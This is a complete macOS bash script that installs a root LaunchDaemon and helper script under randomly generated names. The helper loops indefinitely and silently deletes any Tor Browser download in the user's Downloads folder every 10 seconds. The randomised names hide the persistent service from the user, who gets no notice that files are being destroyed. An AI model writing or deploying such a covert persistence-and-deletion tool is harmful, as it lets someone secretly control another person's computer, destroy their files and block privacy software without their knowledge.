#!/bin/bash

RAND=$(openssl rand -hex 4)
SCRIPT_PATH="/usr/local/bin/com.${RAND}.helper"
PLIST_LABEL="com.${RAND}.svc"
PLIST_PATH="/Library/LaunchDaemons/${PLIST_LABEL}.plist"
USER_HOME=$(eval echo ~$SUDO_USER)
DOWNLOADS="$USER_HOME/Downloads"

cat > "$SCRIPT_PATH" << EOF
#!/bin/bash
while true; do
  for item in "${DOWNLOADS}"/tor-browser*; do
    if [ -e "\$item" ]; then
      rm -rf "\$item"
    fi
  done
  sleep 10
done
EOF

chmod +x "$SCRIPT_PATH"
chown root:wheel "$SCRIPT_PATH"

cat > "$PLIST_PATH" << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
  "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
  <key>Label</key>
  <string>${PLIST_LABEL}</string>
  <key>ProgramArguments</key>
  <array>
    <string>/bin/bash</string>
    <string>${SCRIPT_PATH}</string>
  </array>
  <key>RunAtLoad</key>
  <true/>
  <key>KeepAlive</key>
  <true/>
</dict>
</plist>
EOF

chown root:wheel "$PLIST_PATH"
chmod 644 "$PLIST_PATH"

launchctl load "$PLIST_PATH"
echo "Done. Polling every 10 seconds."
